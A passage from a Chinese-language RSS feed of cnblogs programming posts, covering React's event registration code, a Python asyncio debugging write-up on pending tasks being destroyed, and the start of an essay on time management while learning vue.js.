          if (!isMediaEvent) {
            trapBubbledEvent(dependency, mountAt);
          }
          break;
        }
        // 标记该原生事件类型已被注册，下次注册同类型事件时会被忽略
        isListening[dependency] = true;  
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;trapCapturedEvent&lt;/code&gt;与&lt;code&gt;trapBubbledEvent&lt;/code&gt;的区别是前者注册捕获阶段的事件监听器，后者注册冒泡阶段的事件监听器。&lt;code&gt;trapCapturedEvent&lt;/code&gt;使用比较少，所以重点看下&lt;code&gt;trapBubbledEvent&lt;/code&gt;。&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;//click document
function trapBubbledEvent(topLevelType, element) {
  if (!element) {
    return null;
  }
  // 从字面意能看出，前者是交互类事件，优先级会比普通事件高（click的分发者是dispatchInteractiveEvent）
  var dispatch = isInteractiveTopLevelEventType(topLevelType) ? dispatchInteractiveEvent : dispatchEvent;
    
  // 注册事件，在冒泡阶段捕获   
  addEventBubbleListener(element, getRawEventName(topLevelType),
  // Check if interactive and wrap in interactiveUpdates
  dispatch.bind(null, topLevelType));
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;总结&quot;&gt;总结&lt;/h4&gt;
&lt;p&gt;可以发现，React把某一类型事件通过事件代理绑定到&lt;code&gt;document&lt;/code&gt;或&lt;code&gt;fragment&lt;/code&gt;上（&lt;code&gt;fragment&lt;/code&gt;的情况比较少）。即&lt;code&gt;workInProgress&lt;/code&gt;在&lt;code&gt;complete&lt;/code&gt;过程中，如果之前已经注册过&lt;code&gt;onClick&lt;/code&gt;事件，后续&lt;code&gt;workInProgress&lt;/code&gt;中的&lt;code&gt;onClick&lt;/code&gt;事件将不再注册，统一由&lt;code&gt;document&lt;/code&gt;中注册的&lt;code&gt;click&lt;/code&gt;事件代理处理。&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 15:16:00 +0000</pubDate>
<dc:creator>Raion</dc:creator>
<og:description>事件机制 React事件主要分为两部分: 事件注册与事件分发。下面先从事件注册说起。 事件注册 假设我们的程序如下: 事件注册主要发生在初始化Dom属性的时候，调用 方法，对一些类型dom进行事件绑定</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/raion/p/10581960.html</dc:identifier>
</item>
<item>
<title>关于asyncio知识（四） - python修行路</title>
<link>http://www.cnblogs.com/zhaof/p/10581972.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhaof/p/10581972.html</guid>
<description>&lt;h2 id=&quot;h2--asyncio-&quot;&gt;一、使用 asyncio 总结&lt;/h2&gt;
&lt;p&gt;最近在公司的一些项目中开始慢慢使用python 的asyncio, 使用的过程中也是各种踩坑，遇到的问题也不少，其中有一次是内存的问题，自己也整理了遇到的问题以及解决方法详细内容看：&lt;a href=&quot;https://www.syncd.cn/article/memory_trouble&quot;&gt;https://www.syncd.cn/article/memory_trouble&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在前面整理的三篇asyncio文章中，也都是使用asyncio的一些方法，但是在实际项目中使用还是避免不了碰到问题， 在这周的工作中遇到之前碰见过的问题，一个初学asyncio写代码中经常会碰到的问题，我的业务代码在运行一段时间后提示如下错误提示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
Task was destroyed but it &lt;span&gt;is&lt;/span&gt; pending!task: &amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at ex10.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这个错误我在前面几篇关于asyncio的系列文章中也反复说过这个问题，我也认为自己不会在出现这种问题，但是意外的是，我的程序还是出现了这个错误。&lt;/p&gt;
&lt;p&gt;我将我的业务代码通过一个demo代码进行模拟复现以及解决这个问题，下面整理的就是这个过程&lt;/p&gt;
&lt;h2 id=&quot;h2--task-was-destroyed-but-it-is-pending-&quot;&gt;二、“Task was destroyed but it is pending!”&lt;/h2&gt;
&lt;p&gt;我通过下面这张图先描述一下demo程序的逻辑：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/997599/201903/997599-20190322225901944-77229557.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; asyncio
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; asyncio &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Queue
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; uuid
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; asyncio &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Lock
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; asyncio &lt;span&gt;import&lt;/span&gt;&lt;span&gt; CancelledError
queue &lt;/span&gt;=&lt;span&gt; Queue()
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; HandleMsg(object):
    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;(self, unid, coroutine_queue, handle_manager):
        self.unid &lt;/span&gt;=&lt;span&gt; unid
        self.coroutine_queue &lt;/span&gt;=&lt;span&gt; coroutine_queue
        self.handle_manager &lt;/span&gt;=&lt;span&gt; handle_manager
    async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_msg(self):
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
            coroutine_msg &lt;/span&gt;=&lt;span&gt; await self.coroutine_queue.get()
            msg_type &lt;/span&gt;= coroutine_msg.get(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; msg_type == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;recv unid [%s] is start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.unid)
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;recv unid [%s] is end&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.unid)
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 每个当一个unid收到end消息为结束&lt;/span&gt;
&lt;span&gt;                await self.handle_manager.del_unid(self.unid)
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; HandleManager(object):
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    用于unid和queue的关系的处理
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;(self):
        self.loop &lt;/span&gt;=&lt;span&gt; asyncio.get_event_loop()
        self.lock &lt;/span&gt;= Lock(loop=&lt;span&gt;self.loop)
        self.handle_dict &lt;/span&gt;=&lt;span&gt; dict()
    async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; unid_bind(self, unid, coroutine_queue):
        async with self.lock:
            self.handle_dict[unid] &lt;/span&gt;=&lt;span&gt; coroutine_queue
    async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_queue(self, unid):
        async with self.lock:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; unid &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self.handle_dict:
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; self.handle_dict[unid]
    async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; del_unid(self, unid):
        async with self.lock:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; unid &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self.handle_dict:
                self.handle_dict.pop(unid)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; make_uniqueid():
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    生成unid
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    uniqueid &lt;/span&gt;=&lt;span&gt; str(uuid.uuid1())
    uniqueid &lt;/span&gt;= uniqueid.split(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    uniqueid.reverse()
    uniqueid &lt;/span&gt;= &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;.join(uniqueid)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; uniqueid
async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; product_msg():
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    生产者
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
        unid &lt;/span&gt;=&lt;span&gt; make_uniqueid()
        msg_start &lt;/span&gt;= {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: unid, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;}
        await queue.put(msg_start)
        msg_end &lt;/span&gt;= {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: unid, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;end&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;}
        await queue.put(msg_end)
        loop &lt;/span&gt;=&lt;span&gt; asyncio.get_event_loop()
        await asyncio.sleep(&lt;/span&gt;0.2, loop=&lt;span&gt;loop)
async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; consumer_from_queue(handle_manager):
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    消费者
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
        msg &lt;/span&gt;=&lt;span&gt; await queue.get()
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;consumer recv %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; msg)
        msg_type &lt;/span&gt;= msg.get(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        unid &lt;/span&gt;= msg.get(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; msg_type == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
            coroutine_queue &lt;/span&gt;= Queue()  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 用于和handle_msg协程进行数据传递&lt;/span&gt;
            handle_msg =&lt;span&gt; HandleMsg(unid, coroutine_queue, handle_manager)
            await handle_manager.unid_bind(unid, coroutine_queue)
            await coroutine_queue.put(msg)
            loop &lt;/span&gt;=&lt;span&gt; asyncio.get_event_loop()
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 每次的start消息创建一个task 去处理消息&lt;/span&gt;
&lt;span&gt;            loop.create_task(handle_msg.get_msg())
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
            coroutine_queue &lt;/span&gt;=&lt;span&gt; await handle_manager.get_queue(unid)
            await coroutine_queue.put(msg)
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
    loop &lt;/span&gt;=&lt;span&gt; asyncio.get_event_loop()
    handle_manager &lt;/span&gt;=&lt;span&gt; HandleManager()
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;  在最开始创建了两个task 分别是生产者和消费者&lt;/span&gt;
&lt;span&gt;    loop.create_task(product_msg())
    loop.create_task(consumer_from_queue(handle_manager))
    loop.run_forever()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面的代码表面上看没啥问题，我们先看看运行效果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
consumer recv {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;784f436cfaf388f611e94ca974e1ffbe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;}
consumer recv {&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;784f436cfaf388f611e94ca974e1ffbe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;end&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;}
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
..........&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;程序没运行一段时间都会出现上面显示的错误提示，我先看看错误提示的信息：&lt;/p&gt;
&lt;blockquote&gt;

&lt;ol class=&quot;linenums&quot;&gt;&lt;li class=&quot;L2&quot;&gt;&lt;code class=&quot;lang-python&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Task &lt;span class=&quot;pln&quot;&gt;was destroyed but it &lt;span class=&quot;kwd&quot;&gt;is &lt;span class=&quot;pln&quot;&gt;pending&lt;span class=&quot;pun&quot;&gt;!&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/li&gt;
&lt;li class=&quot;L3&quot;&gt;&lt;code class=&quot;lang-python&quot;&gt;&lt;span class=&quot;pln&quot;&gt;task&lt;span class=&quot;pun&quot;&gt;: &lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;span class=&quot;typ&quot;&gt;Task &lt;span class=&quot;pln&quot;&gt;pending coro&lt;span class=&quot;pun&quot;&gt;=&amp;lt;&lt;span class=&quot;typ&quot;&gt;HandleMsg&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;get_msg&lt;span class=&quot;pun&quot;&gt;() &lt;span class=&quot;pln&quot;&gt;done&lt;span class=&quot;pun&quot;&gt;, &lt;span class=&quot;pln&quot;&gt;defined at demo&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;py&lt;span class=&quot;pun&quot;&gt;:&lt;span class=&quot;lit&quot;&gt;17&lt;span class=&quot;pun&quot;&gt;&amp;gt; &lt;span class=&quot;pln&quot;&gt;wait_for&lt;span class=&quot;pun&quot;&gt;=&amp;lt;&lt;span class=&quot;typ&quot;&gt;Future &lt;span class=&quot;pln&quot;&gt;cancelled&lt;span class=&quot;pun&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;

&lt;p&gt;上面提示的其实就是我的task 是在pendding状态的时候被destroyed了，代码行数以及调用方法都告诉我们了是在：HandleMsg.get_msg() done, defined at demo.py:17&lt;/p&gt;
&lt;p&gt;其实问题也比较好找，我们为每个unid创建了一个task来处理消息，但是当我们收到每个unid消息的end消息之后其实这个task任务对于我们来说就已经完成了，同时我们删除了我的unid和queue的绑定，但是我们并没有手动去取消这个task。&lt;/p&gt;
&lt;p&gt; &lt;br/&gt;&lt;span&gt;注意：这里我其实也有一个不理解的地方：关于这个task为什么会会destroyed，这个协程里是一个死循环一直在收消息，当queue里面没有消息协程也应该一直在await 地方在等待才对，但是如果我们把收到end消息的那个地方的删除unid和queue的绑定关系不删除，那么这个任务是不会被descroyed。所以没有完全明白这里的机制，如果明白的同学欢迎留言讨论&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;但是即使上面的机制我们有点不是特别明白，我们其实也应该把这个task手动进行cancel的，我们们将上面的代码稍微进行改动如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
async &lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_msg(self):
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
                coroutine_msg &lt;/span&gt;=&lt;span&gt; await self.coroutine_queue.get()
                msg_type &lt;/span&gt;= coroutine_msg.get(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; msg_type == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;recv unid [%s] is start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.unid)
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;recv unid [%s] is end&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.unid)
                    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 每个当一个unid收到end消息为结束&lt;/span&gt;
&lt;span&gt;                    await self.handle_manager.del_unid(self.unid)
                    current_task &lt;/span&gt;=&lt;span&gt; asyncio.Task.current_task()
                    current_task.cancel()   &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 手动cancel 当前的当前的task&lt;/span&gt;
        &lt;span&gt;except&lt;/span&gt;&lt;span&gt; CancelledError as e:
            &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unid [%s] cancelled success&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %self.unid)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里有个问题需要注意就是当我们对task进行cancel的时候会抛出cancelledError异常，我们需要对异常进行处理。官网也对此进行专门说明：&lt;br/&gt;&lt;a href=&quot;https://docs.python.org/3.6/library/asyncio-task.html#coroutine&quot;&gt;https://docs.python.org/3.6/library/asyncio-task.html#coroutine&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;cancel()
Request that this task cancel itself.
This arranges &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; a CancelledError to be thrown into the wrapped coroutine on the next cycle through the event loop. The coroutine then has a chance to clean up &lt;span&gt;or&lt;/span&gt; even deny the request using &lt;span&gt;try&lt;/span&gt;/&lt;span&gt;except&lt;/span&gt;/&lt;span&gt;finally&lt;/span&gt;&lt;span&gt;.
Unlike Future.cancel(), this does &lt;/span&gt;&lt;span&gt;not&lt;/span&gt; guarantee that the task will be cancelled: the exception might be caught &lt;span&gt;and&lt;/span&gt; acted upon, delaying cancellation of the task &lt;span&gt;or&lt;/span&gt; preventing cancellation completely. The task may also &lt;span&gt;return&lt;/span&gt; a value &lt;span&gt;or&lt;/span&gt; &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; a different exception.
Immediately after this method &lt;/span&gt;&lt;span&gt;is&lt;/span&gt; called, cancelled() will &lt;span&gt;not&lt;/span&gt; &lt;span&gt;return&lt;/span&gt; True (unless the task was already cancelled). A task will be marked as cancelled when the wrapped coroutine terminates with a CancelledError exception (even &lt;span&gt;if&lt;/span&gt; cancel() was &lt;span&gt;not&lt;/span&gt; called).
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;h2--&quot;&gt;三、小结&lt;/h2&gt;
&lt;p&gt;虽然还有一些地方不太明白，但是随着用的越多，碰到的问题越多，一个一个解决，可能现在对某些知识还有点模糊，但是至少比刚开始使用asyncio的时候清晰了好多，之前整理的三篇文章的连接如下：&lt;br/&gt;&lt;a href=&quot;https://www.syncd.cn/article/asyncio_article_01&quot;&gt;https://www.syncd.cn/article/asyncio_article_01&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.syncd.cn/article/asyncio_article_02&quot;&gt;https://www.syncd.cn/article/asyncio_article_02&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.syncd.cn/article/asyncio_article_03&quot;&gt;https://www.syncd.cn/article/asyncio_article_03&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;也欢迎加入交流群一起讨论相关内容：948510543&lt;/p&gt;


</description>
<pubDate>Fri, 22 Mar 2019 15:02:00 +0000</pubDate>
<dc:creator>python修行路</dc:creator>
<og:description>一、使用 asyncio 总结 最近在公司的一些项目中开始慢慢使用python 的asyncio, 使用的过程中也是各种踩坑，遇到的问题也不少，其中有一次是内存的问题，自己也整理了遇到的问题以及解决方</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhaof/p/10581972.html</dc:identifier>
</item>
<item>
<title>时间管理是个&quot;伪命题&quot;吗？ - 美码师</title>
<link>http://www.cnblogs.com/littleatp/p/10581746.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/littleatp/p/10581746.html</guid>
<description>&lt;p&gt;长期以来，时间管理一直被认为是&lt;strong&gt;自我管理，团队管理，项目管理&lt;/strong&gt;的既关键又基础的手段，就连笔者本人也一直在崇尚时间管理的理念。&lt;br/&gt;但是这里要讲的，不是什么鬼神方法论。而主要是对长时间以来学习和实践时间管理的一些感想。&lt;/p&gt;
&lt;h2 id=&quot;时间是难以管理的&quot;&gt;时间是难以管理的&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223604112-1997722361.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;以一个简单点例子来说明：&lt;br/&gt;我今天定了一个目标，打算&lt;strong&gt;花半天时间学习一下 vue.js，做一个基础的 mvc 案例&lt;/strong&gt;出来。&lt;br/&gt;那么假设我有4个小时进行学习，于是我会列出下面的一个计划详单：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第一个小时，&lt;strong&gt;阅读官方文档&lt;/strong&gt;，有一个大致理念上的了解；&lt;/li&gt;
&lt;li&gt;第二个小时，&lt;strong&gt;阅读别人的博客案例&lt;/strong&gt;，了解真实用法是怎么做的；&lt;/li&gt;
&lt;li&gt;第三个小时，&lt;strong&gt;设计我的案例&lt;/strong&gt;，完成简单的界面框架，js方法定义；&lt;/li&gt;
&lt;li&gt;第四个小时，&lt;strong&gt;整合 vue.js&lt;/strong&gt;，实现逻辑代码并完成调试。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;好了，看似近乎完美的一个计划。真实执行起来会是怎么样呢？&lt;/p&gt;
&lt;h3 id=&quot;第一个小时&quot;&gt;第一个小时&lt;/h3&gt;
&lt;p&gt;阅读官方文档，由于有中文材料，很快就读完了，顺便还看了下vue的一些周边框架，如 vux 、mui。&lt;/p&gt;
&lt;h3 id=&quot;第二个小时&quot;&gt;第二个小时&lt;/h3&gt;
&lt;p&gt;阅读别人的博客案例，我找了五篇博客，每一篇都不大一样，关键是其中的一些API用法不尽相同，于是产生了疑惑，开始寻求答案。&lt;br/&gt;于是不停翻看 vue 的 api 说明，对比不同版本内 api 的用法。&lt;br/&gt;然后严重的事情发生了，我开始纠结于使用哪个版本进行学习，是使用最稳定的呢？还是用最新的开发版。&lt;br/&gt;那些流行的 UI 框架又是基于哪个版本开发的，我又开始一通乱找，看看那些 vue版本的比较，看看那些vue生态那些优秀的UI框架支持什么版本。&lt;br/&gt;三个小时过去了，我还是没能做出抉择，眼看时间一点点过去，索性不管了，就用最新的吧...&lt;/p&gt;
&lt;h3 id=&quot;第三个小时&quot;&gt;第三个小时&lt;/h3&gt;
&lt;p&gt;不，应该是&lt;strong&gt;第五个小时&lt;/strong&gt;了，我肚子饿了，于是拿起手机叫个外卖，美团上的优惠券好多阿，不管了，先领了再说。&lt;br/&gt;什么？优惠券要指定商家才能使用？于是又检索几家店家...这次，花掉了一个十亿级大表全表扫描的时间，大概是半小时吧。然后，为了保证后面的精神头，花了半小时午睡。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223644087-1540471819.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;第六个小时&quot;&gt;第六个小时&lt;/h3&gt;
&lt;p&gt;我已经确定要用什么版本了。可是问题来了，我应该用什么IDE进行开发呢？WebStorm好像不错，但是听老王说很重量级。IDEA也可以用，但是毕竟是JAVA的工具...&lt;br/&gt;好了，强迫症再次上头，花十分钟安装WebStom并体验了下觉得不舒服，又转而使用IDEA的插件，这时候，四十分钟过去了。&lt;br/&gt;接下来，凭借自己&lt;strong&gt;&quot;强大的抽象思维&quot;&lt;/strong&gt;快速定义好了接口和基础界面，只花了二十分钟！&lt;/p&gt;
&lt;h3 id=&quot;第七个小时&quot;&gt;第七个小时&lt;/h3&gt;
